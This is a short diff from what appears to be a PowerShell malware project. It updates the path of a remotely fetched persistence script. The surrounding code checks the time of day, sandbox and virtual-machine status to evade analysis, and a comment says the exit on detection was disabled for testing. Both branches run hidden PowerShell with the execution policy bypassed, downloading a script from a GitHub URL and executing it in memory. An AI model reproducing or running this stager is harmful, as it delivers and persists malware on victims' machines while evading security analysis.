@@ -30,7 +30,8 @@ $hourCheck = (Get-Date).Hour -ge 8 -and (Get-Date).Hour -le 18
 If (($n -ne $r) -or (-not $dayCheck) -or (-not $hourCheck) -or $isSandbox -or $isVM) {
     # It Should be here EXIT 'Since Im Testing  in VM i allowed it xDD'
     #Exit
-    powershell -w hidden -ep bypass -c "[PowerShell]::Create().AddScript((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h41th3m0x/NyxCore/refs/heads/main/persistence.ps1')).Invoke()"
+    powershell -w hidden -ep bypass -c "[PowerShell]::Create().AddScript((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h41th3m0x/NyxCore/refs/heads/main/PowerShellScripts/persistence.ps1')).Invoke()"
 } else {
-    powershell -w hidden -ep bypass -c "[PowerShell]::Create().AddScript((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h41th3m0x/NyxCore/refs/heads/main/persistence.ps1')).Invoke()"
+    powershell -w hidden -ep bypass -c "[PowerShell]::Create().AddScript((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h41th3m0x/NyxCore/refs/heads/main/PowerShellScripts/persistence.ps1')).Invoke()"
 }
+
